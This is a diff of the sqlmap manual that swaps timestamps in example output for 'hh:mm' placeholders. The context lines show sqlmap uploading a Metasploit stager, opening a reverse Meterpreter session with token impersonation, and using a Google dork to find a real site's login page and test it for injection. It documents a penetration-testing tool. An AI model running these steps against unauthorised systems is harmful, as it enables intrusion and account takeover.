@@ -4852,19 +4852,19 @@ argument so that it will be started as SYSTEM? [Y/n] y
 chunks, upload them and recreate the original file out of the binary chunks server-side, 
 wait..
 [hh:mm:22] [INFO] file chunk 1 written
-[14:10:06] [INFO] file chunk 2 written
-[14:10:06] [INFO] running Metasploit Framework 3 command line interface locally, wait..
+[hh:mm:06] [INFO] file chunk 2 written
+[hh:mm:06] [INFO] running Metasploit Framework 3 command line interface locally, wait..
 [*] Please wait while we load the module tree...
 [*] Handler binding to LHOST 0.0.0.0
 [*] Started reverse handler
 [*] Starting the payload handler...
-[14:10:31] [INFO] running Metasploit Framework 3 payload stager remotely, wait..
+[hh:mm:31] [INFO] running Metasploit Framework 3 payload stager remotely, wait..
 [*] Transmitting intermediate stager for over-sized stage...(216 bytes)
 [*] Sending stage (718336 bytes)
 [*] Meterpreter session 1 opened (192.168.1.161:61499 -> 192.168.1.131:3221)
 
 meterpreter > 
-[14:11:01] [INFO] loading Meterpreter 'incognito' extension and displaying the list of 
+[hh:mm:01] [INFO] loading Meterpreter 'incognito' extension and displaying the list of 
 Access Tokens availables. Choose which user you want to impersonate by using incognito's 
 command 'impersonate_token'
 Loading extension priv...success.
@@ -5404,26 +5404,26 @@ and resulting page set to 3:
 <tscreen><verb>
 $ python sqlmap.py -g "login ext:php" --gpage=3 -v 1
 
-[14:11:12] [INFO] first request to Google to get the session cookie
-[14:11:12] [INFO] using search result page #3
-[14:11:12] [INFO] sqlmap got 100 results for your Google dork expression, 5 of them are testable targets
-[14:11:12] [INFO] sqlmap got a total of 5 targets
+[hh:mm:12] [INFO] first request to Google to get the session cookie
+[hh:mm:12] [INFO] using search result page #3
+[hh:mm:12] [INFO] sqlmap got 100 results for your Google dork expression, 5 of them are testable targets
+[hh:mm:12] [INFO] sqlmap got a total of 5 targets
 url 1:
 GET http://myjobstreet-beta.jobstreet.com/home/login.php?site=in
 do you want to test this url? [Y/n/q]
 > 
-[14:11:14] [INFO] testing url http://myjobstreet-beta.jobstreet.com/home/login.php?site=in
-[14:11:14] [INFO] using '/home/stamparm/Work/sqlmap/sqlmap/output/None/session' as session file
-[14:11:14] [INFO] testing connection to the target url
-[14:11:15] [INFO] testing if the url is stable, wait a few seconds
-[14:11:19] [INFO] url is stable
-[14:11:19] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[14:11:21] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[14:11:21] [INFO] testing if Cookie parameter 'REFERP' is dynamic
-[14:11:22] [WARNING] Cookie parameter 'REFERP' is not dynamic
-[14:11:22] [INFO] testing if Cookie parameter 'PHPSESSID' is dynamic
-[14:11:24] [INFO] confirming that Cookie parameter 'PHPSESSID' is dynamic
-[14:11:27] [INFO] Cookie parameter 'PHPSESSID' is dynamic
+[hh:mm:14] [INFO] testing url http://myjobstreet-beta.jobstreet.com/home/login.php?site=in
+[hh:mm:14] [INFO] using '/home/stamparm/Work/sqlmap/sqlmap/output/None/session' as session file
+[hh:mm:14] [INFO] testing connection to the target url
+[hh:mm:15] [INFO] testing if the url is stable, wait a few seconds
+[hh:mm:19] [INFO] url is stable
+[hh:mm:19] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
+[hh:mm:21] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+[hh:mm:21] [INFO] testing if Cookie parameter 'REFERP' is dynamic
+[hh:mm:22] [WARNING] Cookie parameter 'REFERP' is not dynamic
+[hh:mm:22] [INFO] testing if Cookie parameter 'PHPSESSID' is dynamic
+[hh:mm:24] [INFO] confirming that Cookie parameter 'PHPSESSID' is dynamic
+[hh:mm:27] [INFO] Cookie parameter 'PHPSESSID' is dynamic
 [...]
 </verb></tscreen>
 
